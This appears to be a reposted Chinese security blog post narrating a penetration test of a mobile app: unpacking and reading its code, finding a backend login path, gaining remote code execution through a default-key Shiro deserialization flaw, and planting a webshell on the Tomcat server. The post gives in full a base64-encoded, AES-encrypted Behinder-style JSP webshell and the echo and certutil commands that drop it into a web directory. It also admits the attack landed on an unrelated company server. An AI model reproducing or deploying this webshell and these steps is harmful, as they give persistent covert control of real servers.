#  APP简单逆向到getshell

1frame  [ 潇湘信安 ](javascript:void\(0\);)

**潇湘信安** ![]()

微信号 xxxasec

功能介绍 一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。

____

__

收录于话题 #实战案例 72个

**声明：**
该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。  
---  
  
  

文章来源：先知社区（1frame）

原文地址：https://xz.aliyun.com/t/10906

  

 **0x01 前言**

某APP渗透测试，主页就一个登录框，登录框认证调用的公司门户站的SSO单点登录，再加上长亭的waf，几乎牢不可破，常规手法都有尝试，没有什么突破点。  

  

 **0x02 脱壳逆向**

jadx一把梭，看看有没有什么敏感信息泄露，审源码的时候发现有爱加密加固，反射大师脱壳一把梭，得到dex文件，然后又jadx一把梭看代码（这个过程就省略了，主题不是它）。

  

 ** **0x03 逆向分析****

大致粗略的看了一下，用的okhttp框架，有反抓包，直接hook绕过即可正常抓包，数据库密码，阿里osskey之类的也没有硬编码在app中，没有什么敏感信息可以利用，登录验证算法都是调用的单点登录，也没有什么突破点。  

![](https://gitee.com/fuli009/images/raw/master/public/20220301183206.png)  

 **0x04 突破口**

 **#1  **正当没啥进展的时候，乱翻了翻基础类源码，发现BaseUrlConfig类中有一串URL，都是一个ip，但是端口不一样。  

  

推荐一款app信息搜集工具，能主动扫描获取app中的url信息，AppInfoScanner

![](https://gitee.com/fuli009/images/raw/master/public/20220301183216.png)  
 **#2**
访问链接，页面空白，由图标得知上面搭载的tomcat。![](https://gitee.com/fuli009/images/raw/master/public/20220301183217.png)  
 **#3**
然后全局搜索`http://`关键词，又搜到一个url（这次是域名），类似于`http://xxxxx:8080/web/weixin/xxxxxx`，浏览器打开看了一下，没啥东西，也是空白页面。因为url中出现weixin关键词，推测两种可能，第一种：登陆点，第二种，微信授权接口。  
所以简单猜了下路径，在weixin后面加了个login，`http://xxxxx:8080/web/weixin/login`，发现登陆点，由于路径跟上面发现的url类似，推测它也是java的后端，直接shiro一把梭，默认key，成功rce，java后端rce一般都是system权限。![]()  

 **0x05  写入webshell踩坑**

RCE之后呢，当然不能只满足现状，为了方便管理，肯定得写个webshell的。写shell用的最多的就几种，小马传大马，手动echo写入，远程下载等方式，这里服务器不通外网，也就没法远程下载了，没有上传点，而且小马的代码量跟冰蝎差不多，就不考虑写小马了。

  

####  **坑1—特殊字符转义**

windows服务器写shell，常规做法无非就是echo shell内容 >
shell.jsp，shell内容中肯定有特殊字符，用^转义一下就行了，但是这里目标环境是jsp，jsp马跟其他马不一样，内容多，特殊字符多，转义起来麻烦得很，我这里以写冰蝎为例，转义了半天，把所有特殊字符都转义了，先本地测试了一下，能成功写马，但是在shiro工具里就不行…估计跟编码有关，大概试了半个多小时，无果，放弃。

  

####  **坑2—BASE解码报错**

特殊字符多，还有一种办法是先把shell内容base64编码一下，然后在目标机上解码，cmd是有base64解码的功能的，具体可以百度certutil用法。

  * 

    
    
    certutil -decode 1.txt 2.txt     //1.txt解码生成2.txt

  
情况还是一样的，本地测试成功，在服务器上就是解码失败，输出长度为0，箭头指向的本来是0的，我偷懒就随便找了张图
。![](https://gitee.com/fuli009/images/raw/master/public/20220301183218.png)  
除此之外，什么字符拼接啊，base64一段段输入然后解码啊，全试过了，不是报错就是写不进去或者是base解码输出长度为0，大概率是目标服务器的问题，在这里浪费了大量时间。  

#####  **成功写入webshell**

最后咋解决的呢，最后采用的fuzz大法，把shell内容一段段base64编码上传，然后解码，一段一段的fuzz测试，看到底是那部分字符导致了base解码失败。

  
最后锁定了冰蝎马的最后四个字符;}%>，不加这四个字符，base64解码能正常输出内容，只要base64编码里是以这四个字符结尾，那么就解码报错。

  

####  **坑3—根目录webshell不解析**

成功写入webshell之后，解码也成功了，webshell地址写在了网站根目录，连接时发现报错，手动访问发现webshell直接变成了下载链接，webshell根本没解析。后来将webshell写入docs目录下才成功解析，因为docs目录是tomcat自带的说明文档目录。  

 **0x06  整理思路**

 **1.  **找到了问题所在，那么就定点打击。思路是：先将除最后四个字符以外的shell内容base编码传到目标上，然后解码输出到2.jsp。

  *   * 

    
    
    echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KQ>1.txtcertutil -decode 1.txt 2.jsp

  
 **2.  **剩下的四个特殊字符经过echo语句手动追加到2.jsp末尾

  * 

    
    
    echo ^;^}^%^>>2.jsp

![](https://gitee.com/fuli009/images/raw/master/public/20220301183219.png)  
 **3.
**最后成功写入docs目录，附上一张连接图![](https://gitee.com/fuli009/images/raw/master/public/20220301183220.png)  

 **0x07  结尾**

这波写shell，大概耗时两个多小时，还有很多小细节没说，本地操作不报错并不代表服务器上操作不会报错，环境可能不一样，有时候还有玄学问题，在此之前我也有过shiro写shell的经历，但是那次没这么多问题，一次性base解码写shell成功，而且直接通过文件下载把webshell下载到目标中也行，每个人遇到的环境都可能不一样，最好的方法就是不断fuzz测试，找到报错的原因，然后精准打击。
**再补充一句…内存马注入也可以，但是容易把站弄崩，别问我怎么知道的，不到万不得已不注入内存马。**  

 ****

最后确认资产的时候没打偏，打到了该公司的一台其他业务的服务器上去了，如果从正面刚APP的话，就算有shiro，也没法绕waf，如果正面无法突破的话，可以尝试搜集一些app内部的敏感信息，说不定有突破口。

  

* * *

 **关 注 有 礼**

  
  
关注公众号回复“9527”可以免费领取一套HTB靶场文档和视频，“1120”安全参考等杂志电子版，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，“2191”潇湘信安文章打包，“1212”在线杀软对比源码+数据源。

![](https://gitee.com/fuli009/images/raw/master/public/20220301183226.png)
还在等什么？赶紧点击下方名片关注学习吧！![](https://gitee.com/fuli009/images/raw/master/public/20220301183226.png)

* * *

 **推 荐 阅 读**

  
  
  
[![](https://gitee.com/fuli009/images/raw/master/public/20220301183227.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491360&idx=1&sn=e4c3d356b45d7fe821dc2b645f30a595&chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20220301183228.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20220301183229.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

* * *

 **欢 迎 私 下 骚 扰**

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20220301183230.png)

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

APP简单逆向到getshell

最多200字，当前共字

__

发送中

[写留言](javascript:;)

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

